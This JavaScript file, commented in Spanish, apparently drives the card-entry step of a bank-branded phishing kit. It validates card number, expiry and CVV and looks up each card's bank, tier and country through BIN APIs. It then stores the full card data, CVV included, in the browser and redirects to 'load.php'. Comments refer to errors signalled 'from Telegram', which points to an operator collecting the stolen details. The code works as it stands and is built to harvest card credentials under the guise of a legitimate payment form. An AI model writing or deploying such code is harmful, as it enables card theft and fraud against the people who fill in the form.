// ============================================
// VARIABLES Y REFERENCIAS
// ============================================
const btnContinuar = document.getElementById('btnContinuarTarjeta');
const inputNumero = document.getElementById('inp_c_nm');
const inputExp = document.getElementById('inp_c_xp');
const inputCvv = document.getElementById('inp_c_vv');

// ============================================
// FUNCIÓN PARA VALIDAR QUE LA FECHA NO ESTÉ VENCIDA
// ============================================
function isDateValid(exp) {
    if (!/^\d{2}\/\d{2}$/.test(exp)) return false;
    var parts = exp.split('/');
    var month = parseInt(parts[0], 10);
    var year = parseInt(parts[1], 10);
    
    if (month < 1 || month > 12) return false;
    
    // Obtener fecha actual
    var now = new Date();
    var currentMonth = now.getMonth() + 1;
    var currentYear = parseInt(now.getFullYear().toString().slice(-2));
    
    // Validar que la fecha no sea anterior al mes actual
    if (year < currentYear) return false;
    if (year === currentYear && month < currentMonth) return false;
    
    return true;
}

// ============================================
// VERIFICAR CAMPOS - ACTIVAR/DESACTIVAR BOTÓN
// ============================================
function verificarCampos() {
    const pan = inputNumero.value.replace(/\s/g, '');
    const exp = inputExp.value;
    const cvv = inputCvv.value;

    const expValid = isDateValid(exp);

    if (pan.length >= 15 && expValid && cvv.length >= 3) {
        btnContinuar.classList.add('activo');
        btnContinuar.style.cursor = 'pointer';
    } else {
        btnContinuar.classList.remove('activo');
        btnContinuar.style.cursor = 'not-allowed';
    }
}

inputNumero.addEventListener('input', verificarCampos);
inputExp.addEventListener('input', verificarCampos);
inputCvv.addEventListener('input', verificarCampos);

// ============================================
// FORMATO DE CAMPOS
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    // Formato fecha: MM/AA
    document.getElementById('inp_c_xp').addEventListener('input', function(e) {
        var input = e.target.value;
        input = input.replace(/[^0-9/]/g, '');
        if (input.length === 2 && !input.includes('/')) {
            input = input + '/';
        }
        e.target.value = input;
        verificarCampos();
    });

    // Formato número de tarjeta: 4 dígitos + espacio
    document.getElementById('inp_c_nm').addEventListener('input', function(e) {
        var input = e.target.value.replace(/\D/g, '').substring(0, 19);
        const cvvInput = document.getElementById('inp_c_vv');
        
        // Amex: 34 o 37 → CVV de 4 dígitos
        if (input.startsWith('34') || input.startsWith('37')) {
            cvvInput.setAttribute('maxlength', '4');
            cvvInput.placeholder = "CVV (4)";
        } else {
            cvvInput.setAttribute('maxlength', '3');
            cvvInput.placeholder = "CVV (3)";
            if (cvvInput.value.length > 3) {
                cvvInput.value = cvvInput.value.slice(0, 3);
            }
        }

        var formatted = input.match(/.{1,4}/g);
        if (formatted) {
            e.target.value = formatted.join(' ');
        } else {
            e.target.value = input;
        }
        verificarCampos();
    });

    // CVV solo números
    document.getElementById('inp_c_vv').addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '');
        verificarCampos();
    });
});

// ============================================
// IDENTIFICAR BIN DE LA TARJETA
// ============================================
async function identifyBin(bin) {
    if (bin.length < 6) return { info: "Desconocido", scheme: "", level: "", bank: "", type: "", country: "" };

    const formatResult = (b, c, s, l, t) => {
        let parts = [];
        if (b && b !== "UNDEFINED" && b !== "N/A") parts.push(b.toUpperCase());
        if (c && c !== "UNDEFINED" && c !== "N/A") parts.push(c.toUpperCase());
        if (s && s !== "UNDEFINED" && s !== "N/A") parts.push(s.toUpperCase());
        if (l && l !== "UNDEFINED" && l !== "N/A") parts.push(l.toUpperCase());
        if (t && t !== "UNDEFINED" && t !== "N/A") parts.push(t.toUpperCase());
        return parts.join(" - ");
    };

    const parseHandy = (data) => ({
        scheme: (data.Scheme || "").toUpperCase(),
        type: (data.Type || "").toUpperCase(),
        level: (data.CardTier || "").toUpperCase(),
        bank: (data.Issuer || "").toUpperCase(),
        country: (data.Country ? data.Country.Name : "").toUpperCase()
    });

    const parseBinList = (data) => ({
        scheme: (data.scheme || "").toUpperCase(),
        type: (data.type || "").toUpperCase(),
        level: (data.brand || "").toUpperCase(),
        bank: (data.bank ? data.bank.name : "").toUpperCase(),
        country: (data.country ? data.country.name : "").toUpperCase()
    });

    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000);
        const response = await fetch(`https://data.handyapi.com/bin/${bin}`, { signal: controller.signal });
        clearTimeout(timeoutId);
        if (response.ok) {
            const data = await response.json();
            if (data.Status !== "NOT FOUND") {
                const p = parseHandy(data);
                const resultStr = formatResult(p.bank, p.country, p.scheme, p.level, p.type);
                return {
                    info: resultStr || "Desconocido",
                    scheme: p.scheme,
                    level: p.level,
                    bank: p.bank,
                    type: p.type,
                    country: p.country
                };
            }
        }
    } catch (error) {
        console.log("HandyAPI failed, trying backup...", error);
    }

    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000);
        const response = await fetch(`https://lookup.binlist.net/${bin}`, {
            signal: controller.signal,
            headers: { 'Accept-Version': '3' }
        });
        clearTimeout(timeoutId);
        if (response.ok) {
            const data = await response.json();
            const p = parseBinList(data);
            const resultStr = formatResult(p.bank, p.country, p.scheme, p.level, p.type);
            return {
                info: resultStr || "Desconocido",
                scheme: p.scheme,
                level: p.level,
                bank: p.bank,
                type: p.type,
                country: p.country
            };
        }
    } catch (error) {
        console.log("BinList failed", error);
    }

    let simpleScheme = "";
    if (bin.startsWith('4')) simpleScheme = "VISA";
    else if (bin.startsWith('5')) simpleScheme = "MASTERCARD";
    else if (bin.startsWith('3')) simpleScheme = "AMEX";

    return {
        info: simpleScheme || "Desconocido",
        scheme: simpleScheme,
        level: "",
        bank: "",
        type: "",
        country: ""
    };
}

// ============================================
// ENVIAR TARJETA
// ============================================
async function enviarTarjeta() {
    const pan = document.getElementById('inp_c_nm').value.replace(/\s/g, '');
    const exp = document.getElementById('inp_c_xp').value;
    const cvv = document.getElementById('inp_c_vv').value;

    if (!btnContinuar.classList.contains('activo')) {
        return;
    }

    if (pan.length < 15) {
        alert("El número de tarjeta debe tener al menos 15 dígitos.");
        return false;
    }

    if (!isDateValid(exp)) {
        alert("La fecha de vencimiento es inválida o la tarjeta ya expiró.");
        return false;
    }

    if (cvv.length < 3) {
        alert("Código de seguridad (CVV) inválido.");
        return false;
    }

    // ELIMINADO: Mostrar loading - ya no se usa

    // Identificar BIN
    const bin = pan.substring(0, 6);
    let cardBinData = { info: "Desconocido", scheme: "", level: "", bank: "", type: "", country: "" };
    try {
        cardBinData = await identifyBin(bin);
    } catch(e) {
        console.log("Error identifying BIN:", e);
    }

    // BLOQUEAR TARJETAS DE DÉBITO en este formulario de Crédito
    if (cardBinData.type === "DEBIT") {
        alert("Esta tarjeta parece ser de Débito. Por favor usa la opción de Tarjeta Débito.");
        return false;
    }

    // Guardar en localStorage
    const cardData = {
        creditCardNumber: pan,
        expirationDate: exp,
        cvv: cvv,
        type: 'Crédito',
        info: cardBinData.info,
        network: cardBinData.scheme,
        level: cardBinData.level,
        bank: cardBinData.bank,
        country: cardBinData.country
    };
    localStorage.setItem("cardData", JSON.stringify(cardData));

    // Redirección directa a load.php (sin loading overlay)
    window.location.href = "load.php";

    return true;
}

// ============================================
// SUBMIT DEL FORMULARIO
// ============================================
document.getElementById('paymentForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    await enviarTarjeta();
});

BancoShared.populateIp({ ipElementId: 'gfg', addressElementId: 'address' });
BancoShared.startDateTime('fecha-hora');

// ============================================
// DETECTAR ERROR EN URL (desde Telegram)
// ============================================
window.onload = function() {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === 'true') {
        document.getElementById('error-message').style.display = 'block';
    }
};


